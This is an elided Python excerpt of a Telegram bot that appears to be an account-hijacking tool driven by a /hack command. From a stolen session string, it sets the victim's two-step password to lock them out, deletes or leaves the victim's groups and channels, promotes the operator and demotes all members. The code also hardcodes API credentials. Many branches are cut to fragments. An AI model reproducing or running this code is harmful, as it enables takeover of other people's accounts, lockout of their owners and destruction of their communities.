...
client = TelegramClient('Tiger', api_id, api_hash).start(bot_token=token)
...
async def user2fa(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_2fa('LEGEND IS BEST')
      return True
    except:
      return False
...
async def start(event):
  ...
  async with bot.conversation(event.chat_id) as x:
    await x.send_message(f"Choose What You Want To Do With String Session \n\n{menu}")
    ...
    if res.text == "A":
      ...
      if len(i) > 3855:
        ...
        file.write(i)
        file.close()
        await bot.send_file(event.chat_id, "info.txt")
      ...
      await event.reply("Joined the Channel/Group")
    elif r == "F":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Leaved the Channel/Group")
    elif r == "G":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Deleted the Channel/Group")
    elif r == "H":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("I am Promoting you in Group/Channel")
    elif res.text == "K":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      try:
        ...
        pass
      await event.reply("I am Demoting all members of Group/Channel")
    elif res.text == "M":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.respond("Wrong Text Found Re-Type /hack")
